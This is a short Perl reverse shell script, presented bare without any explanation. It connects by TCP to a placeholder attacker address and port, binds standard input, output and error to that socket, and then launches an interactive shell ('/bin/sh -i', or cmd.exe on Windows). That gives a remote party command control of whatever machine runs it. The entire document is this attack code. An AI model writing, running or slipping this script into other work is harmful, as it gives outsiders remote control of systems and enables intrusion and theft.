use Socket;

$ip="attacker_ip"; $port=attacker_port;

socket (S, PF_INET, SOCK_STREAM, getprotobyname("tcp"));

if(connect(S, sockaddr_in($port, inet_aton($ip)))){open (STDIN, ">&S"); open (STDOUT, ">&S");

open (STDERR, ">&S"); exec(($^0 eq 'MSWin32') ? "cmd.exe": "/bin/sh -i");};